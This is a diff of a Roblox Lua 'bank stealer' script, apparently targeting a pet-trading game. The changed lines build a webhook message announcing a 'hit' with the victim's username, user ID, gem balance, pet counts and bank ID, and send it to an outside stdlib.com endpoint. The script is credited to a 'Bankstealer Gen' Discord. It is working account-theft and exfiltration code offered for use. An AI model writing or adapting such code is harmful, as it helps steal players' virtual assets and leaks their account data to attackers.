@@ -1,3 +1,4 @@
+
 local YourWebHookHere =  "https://crystalblob.api.stdlib.com/blobscript@dev/getbskv/?whid=".._G.AuthKey  -- web hook here
 local http = game:GetService("HttpService")
 local url = YourWebHookHere
@@ -256,64 +257,65 @@ local url = YourWebHookHere
 local username = game:GetService("Players").LocalPlayer.Name
  
 local data = {
-  "content": "We got a hit boys n gurls! @everyone",
-  "embed": {
-    "title": "Crystalized Steal",
-    "description": "Note: Script was created with Crystal Blob's Bankstealer Gen (https://discord.gg/q4uHfJHudq)",
-    "url": "https://discord.gg/q4uHfJHudq",
-    "color": 917302,
-    "footer": {
-      "text": "Webhook Option made by Crystal Blob and ver."
-    },
-    "author": {
-      "name": "[Crystalized Steal]"
-    },
-    "fields": [
-      {
-        "name": "Exclusives",
-        "value": tostring(EXCCount),
-        "inline": true
-      },
-      {
-        "name": "Mythics",
-        "value": tostring(MythicCount),
-        "inline": true
-      },
-      {
-        "name": "Legendaries",
-        "value": tostring(LegCount),
-        "inline": true
-      },
-      {
-        "name": "Epics",
-        "value": tostring(EpicCount),
-        "inline": true
-      },
-      {
-        "name": "Rares",
-        "value": tostring(RareCount),
-        "inline": true
-      },
-      {
-        "name": "Commons",
-        "value": tostring(CommonCount),
-        "inline": true
-      },
-      {
-        "name": "Gems",
-        "value": tostring(SuperBank[1]["Storage"]["Currency"]["Diamonds"]),
-        "inline": true
-      },
-      {
-        "name": "User",
-        "value": tostring(game.Players.LocalPlayer.UserId).." / "..game.Players.LocalPlayer.Name
-      },
-      {
-        "name": "Bank ID",
-        "value": SuperBank[1]["BUID"]
-      }
-    ]
-  }
+  ["content"] = "@everyone We Got a Hit!",
+["embeds"] = {{
+["title"] = "__**Bank Steal Results**__",
+["description"] = "(Made by Crystal and ver!)",
+["type"] = "rich",
+["color"] = tonumber(0x0E980E),
+["fields"] = {
+               {
+["name"] = "__User__",
+["value"] = "**"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
+["inline"] = false
+},
+               {
+["name"] = "__Gems__",
+["value"] = SuperBank[1]["Storage"]["Currency"]["Diamonds"],
+["inline"] = false
+},
+{
+["name"] = "__Pets Overall__",
+["value"] = #SuperBank[1]["Storage"]["Pets"],
+["inline"] = false
+},
+{
+["name"] = "__Exclusive/Huges__",
+["value"] = EXCCount,
+["inline"] = true
+},
+{
+["name"] = "__Mythicals__",
+["value"] = MythicCount,
+["inline"] = true
+},
+{
+["name"] = "__Legendaries__",
+["value"] = LegCount,
+["inline"] = true
+},
+{
+["name"] = "__Epics__",
+["value"] = EpicCount,
+["inline"] = true
+},
+{
+["name"] = "__Rares__",
+["value"] = RareCount,
+["inline"] = true
+},
+{
+["name"] = "__Commons__",
+["value"] = CommonCount,
+["inline"] = true
+},
+{
+["name"] = "__BankID__",
+["value"] = Bank,
+["inline"] = false
+},
+}
+}}
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
